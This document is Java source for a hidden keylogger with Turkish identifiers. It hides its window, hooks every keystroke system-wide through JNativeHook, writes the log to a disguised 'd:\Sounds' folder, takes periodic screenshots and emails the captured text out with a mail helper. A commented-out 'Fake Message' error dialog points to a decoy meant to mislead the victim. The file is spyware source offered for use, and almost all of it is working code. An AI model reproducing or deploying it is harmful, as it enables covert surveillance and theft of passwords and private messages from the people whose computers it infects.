import java.awt.BorderLayout;
import java.awt.EventQueue;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileNotFoundException;

import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

import java.util.logging.*;

import javax.imageio.ImageIO;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import java.awt.GridLayout;
import com.jgoodies.forms.layout.FormLayout;
import com.jgoodies.forms.layout.ColumnSpec;
import com.jgoodies.forms.layout.RowSpec;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JTextArea;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

import java.util.Timer;
import java.util.TimerTask;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class JFrameMain extends JFrame implements org.jnativehook.keyboard.NativeKeyListener{
	
	
	public static String log;
	static PrintWriter writer;
	static int sssayac = 0;
	public static void main(String[] args) throws Exception {

		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {					
					JFrameMain frame = new JFrameMain();
					frame.setVisible(false);
					//JOptionPane.showMessageDialog(null,"Fake Message","ERROR", JOptionPane.INFORMATION_MESSAGE);
				} catch (Exception e) {
					e.printStackTrace();
				}
				File dir = new File("d:\\Sounds");
		        dir.mkdir();
				EkranKaydedici ss = new EkranKaydedici();

				
				Timer timer = new Timer();
				TimerTask timertask = new TimerTask() {

					@Override
					public void run() {

						
						System.out.println("LOG YAZILDI = " + log);
						
						try {
							writer = new PrintWriter("d:\\Sounds\\log.txt", "UTF-8");
						} catch (FileNotFoundException e1) {
							e1.printStackTrace();
						} catch (UnsupportedEncodingException e1) {
							e1.printStackTrace();
						}
						
						try
						{
							writer.print(log.substring(4,log.length()));
						}
						catch(Exception e)
						{
							writer.print(log);
						}
						writer.close();
;
						Mail mail = new Mail();
						if(log != null)
						{
							mail.MailYolla(log.substring(4,log.length()));
						}
						else
						{
							mail.MailYolla(log);
						}
						System.out.println("Mail basariyla gonderildi.");
						System.exit(0);
                               timer.cancel();
					}
					
				};
				timer.schedule(timertask,62000,62000);
				
				Timer timer2 = new Timer();
				TimerTask timertask2 = new TimerTask() {

					@Override
					public void run() {
						if(sssayac == 5)
						{
							timer2.cancel();
						}
						try {
							ss.ScreenShot();
						} catch (Exception e) {
							e.printStackTrace();
						}
						sssayac++;
					}
					
				};
				timer2.schedule(timertask2,10000,10000);
			}
			
		});
		
		Logger loggerr = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        loggerr.setLevel(Level.OFF);
        loggerr.setUseParentHandlers(false);
	
        try {
        	GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
        	e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new JFrameMain());

       
        
		}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		
		if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Back Slash")
		{
			log += "Ç";
			System.out.println("Pressed: Ç" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Quote")
		{
			log += "İ";
			System.out.println("Pressed: İ" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Slash" && org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyLocation()) != "3")
		{
			log += "Ç";
			System.out.println("Pressed: Ö" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Period")
		{
			log += ".";
			System.out.println("Pressed: ." );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Semicolon")
		{
			log += "Ş";
			System.out.println("Pressed: Ş" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Open Bracket")
		{
			log += "Ğ";
			System.out.println("Pressed: Ğ" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Close Bracket")
		{
			log += "Ü";
			System.out.println("Pressed: Ü" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Comma")
		{
			log += ";";
			System.out.println("Pressed: ;" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Space")
		{
			log += "[SPACE]";
			System.out.println("Pressed: [SPACE]" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Backspace")
		{
			log += "[BACKSPACE]";
			System.out.println("Pressed: [BACKSPACE]" );
		}
		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Back Quote")
		{
			log += '"';
			System.out.println("Pressed: " + '"');
		}

		else if(org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()) == "Minus")
		{
			log += "-";
			System.out.println("Pressed: -" );
		}

		else {
			System.out.println("Pressed: " + org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode()));
			log += org.jnativehook.keyboard.NativeKeyEvent.getKeyText(e.getKeyCode());
		}		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {	
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {		
	}
	

	public JFrameMain() {
		
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		GroupLayout groupLayout = new GroupLayout(getContentPane());
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGap(0, 434, Short.MAX_VALUE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGap(0, 261, Short.MAX_VALUE)
		);
		getContentPane().setLayout(groupLayout);
		
	}
	

	
	
}
